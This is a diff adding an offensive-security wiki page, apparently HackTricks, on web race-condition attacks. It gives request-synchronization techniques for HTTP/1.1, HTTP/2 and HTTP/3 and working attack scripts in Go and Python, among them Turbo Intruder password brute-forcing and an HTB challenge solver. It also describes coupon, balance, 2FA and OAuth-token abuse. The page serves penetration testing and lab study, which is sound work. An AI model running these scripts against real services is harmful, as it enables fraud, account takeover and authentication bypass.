@@ -1,0 +1,524 @@
+# Race Condition
+
+{{#include ../banners/hacktricks-training.md}}
+
+> [!WARNING]
+> For obtaining a deep understanding of this technique check the original report in [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)<sup>[[1]](#references)</sup>
+
+## Enhancing Race Condition Attacks
+
+The main hurdle in exploiting race conditions is ensuring that multiple requests reach the vulnerable state transition together, with **very little difference in processing time—ideally less than 1 ms**.<sup>[[15]](#references)</sup>
+
+Here you can find some techniques for Synchronizing Requests:
+
+#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization
+
+- **HTTP/2**: Supports sending two requests over a single TCP connection, reducing network jitter impact. However, due to server-side variations, two requests may not suffice for a consistent race condition exploit.
+- **HTTP/1.1 'Last-Byte Sync'**: Enables the pre-sending of most parts of 20-30 requests, withholding a small fragment, which is then sent together, achieving simultaneous arrival at the server.
+
+**Preparation for Last-Byte Sync** involves:
+
+1. Sending headers and body data minus the final byte without ending the stream.
+2. Pausing for 100ms post-initial send.
+3. Disabling TCP_NODELAY to utilize Nagle's algorithm for batching final frames.
+4. Pinging to warm up the connection.
+
+The subsequent sending of withheld frames should result in their arrival in a single packet, verifiable via Wireshark. This method does not apply to static files, which are not typically involved in RC attacks.
+
+#### HTTP/3 Last‑Frame Synchronization (QUIC)
+
+- **Concept**: HTTP/3 rides over QUIC (UDP). There’s no TCP coalescing or Nagle to rely on, so classic last‑byte sync doesn’t work with off‑the‑shelf clients. Instead, you need to deliberately coalesce multiple QUIC stream‑final DATA frames (FIN) into the same UDP datagram so the server processes all target requests in the same scheduling tick.
+- **How to do it**: Use a purpose‑built library that exposes QUIC frame control. For example, H3SpaceX manipulates quic-go to implement HTTP/3 last‑frame synchronization for both requests with a body and GET‑style requests without a body.<sup>[[2]](#references)</sup>
+  - Requests‑with‑body: send HEADERS + DATA minus the last byte for N streams, then flush the final byte of each stream together.
+  - GET‑style: craft fake DATA frames (or a tiny body with Content‑Length) and end all streams in one datagram.
+- **Practical limits**:
+  - Concurrency is bounded by the peer’s QUIC max_streams transport parameter (similar to HTTP/2’s SETTINGS_MAX_CONCURRENT_STREAMS). If it’s low, open multiple H3 connections and spread the race across them.
+  - UDP datagram size and path MTU cap how many stream‑final frames you can coalesce. The library handles splitting into multiple datagrams if needed, but a single‑datagram flush is most reliable.
+- **Practice**: There are public H2/H3 race labs and sample exploits accompanying H3SpaceX.
+
+<details>
+<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
+
+```go
+package main
+
+import (
+  "context"
+  "crypto/tls"
+  "net/http"
+  "time"
+
+  "github.com/quic-go/quic-go"
+  h3 "github.com/nxenon/h3spacex/http3"
+)
+
+func main() {
+  tlsConf := &tls.Config{InsecureSkipVerify: true, NextProtos: []string{h3.NextProtoH3}}
+  quicConf := &quic.Config{MaxIdleTimeout: 10 * time.Second, KeepAlivePeriod: 10 * time.Millisecond}
+  conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
+  var reqs []*http.Request
+  for i := 0; i < 50; i++ {
+    r, _ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"cookie": "sess=...", "content-type": "application/json"}, []byte(`{"coupon":"SAVE"}`))
+    reqs = append(reqs, &r)
+  }
+  h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
+}
+```
+</details>
+
+#### HTTP/3 Practical Tooling
+
+- **QuicDraw(H3)** is a ready-made CLI/UI for HTTP/3 race testing. It implements `Quic-Fin-Sync`, so it is handy when you want to replay the same request many times (`-tr`) or fuzz a request by placing `FUZZ` in the POST body and feeding a wordlist with `-w`.<sup>[[3]](#references)</sup>
+- Logging QUIC secrets with `-l /tmp/sslkeys.log` makes Wireshark verification much easier, because you can confirm whether the final frames were actually coalesced and whether packet loss/fragmentation ruined the release point.
+- A practical consequence from newer HTTP/3 research is that **failing with 2-10 requests does not prove an H3 target is safe**. User-space QUIC stacks may absorb small bursts and only start collapsing into a useful race window once you push much higher concurrency, so test more streams and, if needed, multiple QUIC connections.
+
+```bash
+pip install quicdraw
+quicdraw https://target/apply -d '{"coupon":"SAVE"}' -H 'cookie: session=...' -H 'content-type: application/json' -tr 20 -l /tmp/sslkeys.log -v
+quicdraw https://target/apply -d '{"coupon":"FUZZ"}' -H 'content-type: application/json' -w ./codes.txt
+```
+
+### Adapting to Server Architecture
+
+Understanding the target's architecture is crucial. Front-end servers might route requests differently, affecting timing. Preemptive server-side connection warming, through inconsequential requests, might normalize request timing.
+
+#### Shared-nothing / sharded back-ends
+
+If a front-end hashes on **cookie**, **client IP**, **tenant**, or the **object identifier** being modified, two perfectly synchronized requests might still land on different app nodes, workers, or queues and never contend on the same state. Keep the **same auth context** and the **same business object identifiers** across the whole batch. When you need multiple H2/H3 connections because of stream limits, warm each connection first and compare timing or response headers to spot when a different backend handled the request.
+
+#### Handling Session-Based Locking
+
+Frameworks like PHP's session handler serialize requests by session, potentially obscuring vulnerabilities. Utilizing different session tokens for each request can circumvent this issue.
+
+#### Overcoming Rate or Resource Limits
+
+If connection warming is ineffective, triggering web servers' rate or resource limit delays intentionally through a flood of dummy requests might facilitate the single-packet attack by inducing a server-side delay conducive to race conditions.
+
+#### Async workers, queues and idempotency layers
+
+Modern APIs often split one logical action across several steps: **validate request**, **snapshot state**, **enqueue a job**, and **finalize later in another worker**. These flows are excellent race-condition targets because the first request may expose a brief **"accepted but not fully committed"** state.
+
+High-value probes:
+
+- **Checkout / order placement** vs **cart mutation**, **gift-card redemption**, or **apply-coupon**
+- **Email / OTP issuance** vs **profile/email changes**
+- **OAuth code/token redemption** and **refresh-token rotation**
+- **Invite/referral/credit** creation vs reuse
+- **Idempotency-key-protected APIs** where the key is checked before the final write is committed
+
+Do not assume `Idempotency-Key` / `X-Request-ID` headers make an endpoint safe. A common anti-pattern is: **lookup key -> perform action -> store key/result**. If two requests with the same key run concurrently, or hit different workers, both may still execute. Good probes are:
+
+- same body + same idempotency key
+- same key + slightly different body
+- same logical action over alternate endpoints or API versions
+- same checkout raced over multiple warmed connections when one connection is limited by `SETTINGS_MAX_CONCURRENT_STREAMS`
+
+## Attack Examples
+
+- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: You can send the request to **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), you can change in the request the value you want to brute force for **`%s`** like in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` and then select the **`examples/race-single-packet-attack.py`** from the drop down:
+
+<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>
+
+If you are going to **send different values**, you could modify the code with this one that uses a wordlist from the clipboard:
+
+```python
+    passwords = wordlists.clipboard
+    for password in passwords:
+        engine.queue(target.req, password, gate='race1')
+```
+
+> [!WARNING]
+> If the web doesn't support HTTP2 (only HTTP1.1) use `Engine.THREADED` or `Engine.BURP` instead of `Engine.BURP2`.
+
+- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: In case you need to send a request to 1 endpoint and then multiple to other endpoints to trigger the RCE, you can change the `race-single-packet-attack.py` script with something like:
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+
+    # Hardcode the second request for the RC
+    confirmationReq = '''POST /confirm?token[]= HTTP/2
+Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
+Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
+Content-Length: 0
+
+'''
+
+    # For each attempt (20 in total) send 50 confirmation requests.
+    for attempt in range(20):
+        currentAttempt = str(attempt)
+        username = 'aUser' + currentAttempt
+
+        # queue a single registration request
+        engine.queue(target.req, username, gate=currentAttempt)
+
+        # queue 50 confirmation requests - note that this will probably be sent in two separate packets
+        for i in range(50):
+            engine.queue(confirmationReq, gate=currentAttempt)
+
+        # send all the queued requests for this attempt
+        engine.openGate(currentAttempt)
+```
+
+- It's also available in **Repeater** via the new '**Send group in parallel**' option in Burp Suite.
+  - For **limit-overrun** you could just add the **same request 50 times** in the group.
+  - For **connection warming**, you could **add** at the **beginning** of the **group** some **requests** to some non static part of the web server.
+  - For **delaying** the process **between** processing **one request and another** in a 2 substates steps, you could **add extra requests between** both requests.
+  - For a **multi-endpoint** RC you could start sending the **request** that **goes to the hidden state** and then **50 requests** just after it that **exploits the hidden state**.
+
+<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>
+
+- **PacketSprinter (Burp extension)**: Useful when you want the **HTTP/2 single-packet** workflow without writing Turbo Intruder code. It lets you duplicate a base request in bulk, send the whole batch in parallel, and compare every response side by side.<sup>[[4]](#references)</sup>
+  - Great for quick **limit-overrun**, **coupon/gift-card**, and **order-placement** tests where the main question is “which requests won?”.
+  - Current caveats: it focuses on **HTTP/2**. It does **not** replace **HTTP/1.1 last-byte sync** or **HTTP/3** tooling.
+- **Recent Burp builds** improved the accuracy of the built-in single-packet attack for **very small race windows**. If an old test only worked sporadically, repeat it with an up-to-date Burp build before assuming the target is fixed.<sup>[[5]](#references)</sup>
+
+- **Automated python script**: The goal of this script is to change the email of a user while continually verifying it until the verification token of the new email arrives to the last email (this is because in the code it was seeing a RC where it was possible to modify an email but have the verification sent to the old one because the variable indicating the email was already populated with the first one).\
+  When the word "objetivo" is found in the received emails we know we received the verification token of the changed email and we end the attack.
+
+```python
+# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
+# Script from victor to solve a HTB challenge
+from h2spacex import H2OnTlsConnection
+from time import sleep
+from h2spacex import h2_frames
+import requests
+
+cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"
+
+# change these headers
+
+headersObjetivo= """accept: */*
+content-type: application/x-www-form-urlencoded
+Cookie: "+cookie+"""
+Content-Length: 112
+"""
+
+bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'
+
+headersVerification= """Content-Length: 1
+Cookie: "+cookie+"""
+"""
+CSRF="42a08872-610a-4965-9553-22d7b3aa1827"
+
+host = "94.237.56.46"
+puerto =39697
+
+
+url = "https://"+host+":"+str(puerto)+"/email/"
+
+response = requests.get(url, verify=False)
+
+
+while "objetivo" not in response.text:
+
+    urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"
+
+    responseDeleteMails = requests.get(urlDeleteMails, verify=False)
+    #print(response.text)
+    # change this host name to new generated one
+
+    Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
+    data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
+    urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
+    responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)
+
+    print(responseReset.status_code)
+
+    h2_conn = H2OnTlsConnection(
+        hostname=host,
+        port_number=puerto
+    )
+
+    h2_conn.setup_connection()
+
+    try_num = 100
+
+    stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)
+
+    all_headers_frames = []  # all headers frame + data frames which have not the last byte
+    all_data_frames = []  # all data frames which contain the last byte
+
+
+    for i in range(0, try_num):
+        last_data_frame_with_last_byte=''
+        if i == try_num/2:
+            header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
+                method='POST',
+                headers_string=headersObjetivo,
+                scheme='https',
+                stream_id=stream_ids_list[i],
+                authority=host,
+                body=bodyObjetivo,
+                path='/challenge/api/profile'
+            )
+        else:
+            header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
+                method='GET',
+                headers_string=headersVerification,
+                scheme='https',
+                stream_id=stream_ids_list[i],
+                authority=host,
+                body=".",
+                path='/challenge/api/sendVerification'
+            )
+
+        all_headers_frames.append(header_frames_without_last_byte)
+        all_data_frames.append(last_data_frame_with_last_byte)
+
+
+    # concatenate all headers bytes
+    temp_headers_bytes = b''
+    for h in all_headers_frames:
+        temp_headers_bytes += bytes(h)
+
+    # concatenate all data frames which have last byte
+    temp_data_bytes = b''
+    for d in all_data_frames:
+        temp_data_bytes += bytes(d)
+
+    h2_conn.send_bytes(temp_headers_bytes)
+
+    # wait some time
+    sleep(0.1)
+
+    # send ping frame to warm up connection
+    h2_conn.send_ping_frame()
+
+    # send remaining data frames
+    h2_conn.send_bytes(temp_data_bytes)
+
+    resp = h2_conn.read_response_from_socket(_timeout=3)
+    frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
+    frame_parser.add_frames(resp)
+    frame_parser.show_response_of_sent_requests()
+
+    print('---')
+
+    sleep(3)
+    h2_conn.close_connection()
+
+    response = requests.get(url, verify=False)
+```
+
+#### Turbo Intruder: engine and gating notes
+
+- Engine selection: use `Engine.BURP2` on HTTP/2 targets to trigger the single‑packet attack; fall back to `Engine.THREADED` or `Engine.BURP` for HTTP/1.1 last‑byte sync.
+- `gate`/`openGate`: queue many copies with `gate='race1'` (or per‑attempt gates), which withholds the tail of each request; `openGate('race1')` flushes all tails together so they arrive nearly simultaneously.
+- Diagnostics: negative timestamps in Turbo Intruder indicate the server responded before the request was fully sent, proving overlap. This is expected in true races.
+- Connection warming: send a ping or a few harmless requests first to stabilise timings; optionally disable `TCP_NODELAY` to encourage batching of the final frames.
+
+
+### Improving Single Packet Attack
+
+In the original research it's explained that this attack has a limit of 1,500 bytes. However, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), it was explained how it's possible to extend the 1,500-byte limitation of the single packet attack to the **65,535 B window limitation of TCP by using IP layer fragmentation** (splitting a single packet into multiple IP packets) and sending them in different order, allowed to prevent reassembling the packet until all the fragments reached the server. This technique allowed the researcher to send 10,000 requests in about 166ms.<sup>[[6]](#references)</sup>
+
+Note that although this improvement makes the attack more reliable in RC that requires hundreds/thousands of packets to arrive at the same time, it might also have some software limitations. Some popular HTTP servers like Apache, Nginx and Go have a strict `SETTINGS_MAX_CONCURRENT_STREAMS` setting to 100, 128 and 250. However, others like NodeJS and nghttp2 have it unlimited.\
+This basically means that Apache will only consider 100 HTTP connections from a single TCP connection (limiting this RC attack). For HTTP/3, the analogous limit is QUIC’s max_streams transport parameter – if it’s small, spread your race across multiple QUIC connections.
+
+You can find some examples using this technique in the repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).
+
+## Raw BF
+
+Before the previous research these were some payloads used which just tried to send the packets as fast as possible to cause a RC.
+
+- **Repeater:** Check the examples from the previous section.
+- **Intruder**: Send the **request** to **Intruder**, set the **number of threads** to **30** inside the **Options menu and,** select as payload **Null payloads** and generate **30.**
+- **Turbo Intruder**
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+    a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
+    for i in range(len(a)):
+        engine.queue(target.req,a[i], gate='race1')
+    # open TCP connections and send partial requests
+    engine.start(timeout=10)
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+- **Python - asyncio**
+
+```python
+import asyncio
+import httpx
+
+async def use_code(client):
+    resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
+    return resp.text
+
+async def main():
+    async with httpx.AsyncClient() as client:
+        tasks = []
+        for _ in range(20): #20 times
+            tasks.append(asyncio.ensure_future(use_code(client)))
+
+        # Get responses
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+
+        # Print results
+        for r in results:
+            print(r)
+
+        # Async2sync sleep
+        await asyncio.sleep(0.5)
+    print(results)
+
+asyncio.run(main())
+```
+
+## **RC Methodology**
+
+### Limit-overrun / TOCTOU
+
+This is the most basic type of race condition where **vulnerabilities** that **appear** in places that **limit the number of times you can perform an action**. Like using the same discount code in a web store several times. A very easy example can be found in [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) or in [**this bug**](https://hackerone.com/reports/759247)**.**<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>
+
+There are many variations of this kind of attack, including:
+
+- Redeeming a gift card multiple times
+- Rating a product multiple times
+- Withdrawing or transferring cash in excess of your account balance
+- Reusing a single CAPTCHA solution
+- Bypassing an anti-brute-force rate limit
+
+Modern variants often hide behind "safe-looking" APIs such as **checkout**, **store-credit / loyalty spend**, **gift-card redemption**, or **idempotency-key-protected payment** endpoints. When testing these, do not only race identical requests. Also race the **finalization** request against **state-changing** requests that affect the same balance/object.
+
+### **Hidden substates**
+
+Exploiting complex race conditions often involves taking advantage of brief opportunities to interact with hidden or **unintended machine substates**. Here’s how to approach this:
+
+1. **Identify Potential Hidden Substates**
+   - Start by pinpointing endpoints that modify or interact with critical data, such as user profiles or password reset processes. Focus on:
+     - **Storage**: Prefer endpoints that manipulate server-side persistent data over those handling data client-side.
+     - **Action**: Look for operations that alter existing data, which are more likely to create exploitable conditions compared to those that add new data.
+     - **Keying**: Successful attacks usually involve operations keyed on the same identifier, e.g., username or reset token.
+2. **Conduct Initial Probing**
+   - Test the identified endpoints with race condition attacks, observing for any deviations from expected outcomes. Unexpected responses or changes in application behavior can signal a vulnerability.
+3. **Demonstrate the Vulnerability**
+   - Narrow down the attack to the minimal number of requests needed to exploit the vulnerability, often just two. This step might require multiple attempts or automation due to the precise timing involved.
+
+#### Finding hidden substates faster
+
+If every raced request returns the same status/body, don't stop there. A useful workflow is:
+
+1. Build **two near-identical requests** where only one should hit the suspected hidden branch.
+2. Release them with the **same synchronization primitive** (single-packet / last-byte / last-frame) and **alternate the order** across many attempts.
+3. Compare timing deltas, not just bodies. Tiny differences can reveal a hidden validation step, cache miss, backend lookup, or lock contention even when the visible response is identical.
+
+If you confirm a timing signal first, come back and turn it into a full race exploit. For more ideas check [Timing Attacks](timing-attacks.md).
+
+### Time Sensitive Attacks
+
+Precision in timing requests can reveal vulnerabilities, especially when predictable methods like timestamps are used for security tokens. For instance, generating password reset tokens based on timestamps could allow identical tokens for simultaneous requests.
+
+**To Exploit:**
+
+- Use precise timing, like a single packet attack, to make concurrent password reset requests. Identical tokens indicate a vulnerability.
+
+**Example:**
+
+- Request two password reset tokens at the same time and compare them. Matching tokens suggest a flaw in token generation.
+
+This pattern is especially common in [**reset-password flows**](reset-password.md) and [**OAuth code redemption**](oauth-to-account-takeover.md).
+
+**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**
+
+## Hidden substates case studies
+
+### Pay & add an Item
+
+Check this [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) to see how to **pay** in a store and **add an extra** item you that **won't need to pay for it**.
+
+### Checkout snapshot / balance masking
+
+A very common modern e-commerce variant is to start **`/checkout`** while simultaneously changing the **cart**, **gift-card balance**, **store credit**, or **coupon state**. If the checkout path snapshots one object early and later commits against a partially stale view, you can **overdraw balances** or **obtain items added after the payment check**.<sup>[[9]](#references)</sup>
+
+This is especially worth testing when:
+
+- totals are recalculated by a different service than the one that authorizes payment
+- gift cards / credits are stored separately from the order row
+- the API exposes both **"apply discount"** and **"place order"** endpoints instead of one atomic transaction
+
+### Confirm other emails
+
+The idea is to **verify an email address and change it to a different one at the same time** to find out if the platform verifies the new one changed.
+
+### Cookie-based change to two email addresses
+
+According to [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab was vulnerable to a takeover this way because it might **send** the **email verification token of one email to the other email**.<sup>[[1]](#references)</sup>
+
+**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**
+
+### Hidden Database states / Confirmation Bypass
+
+If **2 different writes** are used to **add** **information** inside a **database**, there is a small portion of time where **only the first data has been written** inside the database. For example, when creating a user the **username** and **password** might be **written** and **then the token** to confirm the newly created account is written. This means that for a small time the **token to confirm an account is null**.
+
+Therefore **registering an account and sending several requests with an empty token** (`token=` or `token[]=` or any other variation) to confirm the account right away could allow to c**onfirm an account** where you don't control the email.
+
+**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**
+
+### Bypass 2FA
+
+The following pseudo-code is vulnerable to race condition because in a very small time the **2FA is not enforced** while the session is created:
+
+See [**2FA Bypass**](2fa-bypass.md) for additional workflow bugs once you confirm a race window.
+
+```python
+session['userid'] = user.userid
+if user.mfa_enabled:
+    session['enforce_mfa'] = True
+    # generate and send MFA code to user
+    # redirect browser to MFA code entry form
+```
+
+### OAuth2 eternal persistence
+
+OAuth providers let applications authenticate registered users and request access to selected user data. A catalog of well-known providers can help identify implementations to test.<sup>[[16]](#references)</sup> The user normally sees a consent prompt such as: “_Application ExampleApp wants to access your information; do you want to allow it?_”
+
+#### Race Condition in `authorization_code`
+
+After consent, the provider sends an **`authorization_code`** to the application. A vulnerable provider may let the application race code redemption and generate more than one access-token/refresh-token (AT/RT) pair from the same code. If revocation deletes only one pair, the concurrently created tokens may remain valid after the user withdraws consent.<sup>[[14]](#references)</sup>
+
+#### Race Condition in `Refresh Token`
+
+Once you have **obtained a valid RT** you could try to **abuse it to generate several AT/RT** and **even if the user cancels the permissions** for the malicious application to access his data, **several RTs will still be valid.**<sup>[[13]](#references)</sup>
+
+See [**OAuth to Account Takeover**](oauth-to-account-takeover.md) for more OAuth-specific race/replay primitives.
+
+## **RC in WebSockets**
+
+- [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) is a Java PoC for sending WebSocket messages in **parallel** to test race conditions.
+- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).<sup>[[10]](#references)</sup><sup>[[11]](#references)</sup><sup>[[12]](#references)</sup>
+- The extension is now in PortSwigger’s **BApp Store**, which makes ad-hoc WS race testing much easier during a normal Burp assessment.
+
+## References
+
+- [1] [Smashing the state machine: the true potential of web race conditions](https://portswigger.net/research/smashing-the-state-machine)
+- [2] [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
+- [3] [Racing and Fuzzing HTTP/3: Open-sourcing QuicDraw(H3)](https://www.cyberark.com/resources/threat-research-blog/racing-and-fuzzing-http-3-open-sourcing-quicdraw)
+- [4] [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)
+- [5] [What's new in Burp Suite Professional: A year of innovation](https://portswigger.net/blog/whats-new-in-burp-suite-professional-a-year-of-innovation)
+- [6] [Beyond the Limit: Expanding Single Packet Race Condition with First Sequence Sync](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
+- [7] [HackerOne report #759247](https://hackerone.com/reports/759247)
+- [8] [RACE Condition vulnerability found in bug-bounty program](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43)
+- [9] [Allow to enable lock for order placement · Issue #7325](https://github.com/nopSolutions/nopCommerce/issues/7325)
+- [10] [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
+- [11] [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
+- [12] [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
+- [13] [Race Conditions - exploring the possibilities](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
+- [14] [HackerOne report #55140](https://hackerone.com/reports/55140)
+- [15] [PortSwigger Web Security Academy - Race conditions](https://portswigger.net/web-security/race-conditions)
+- [16] [Wikipedia: List of OAuth providers](https://en.wikipedia.org/wiki/List_of_OAuth_providers)
+
+{{#include ../banners/hacktricks-training.md}}
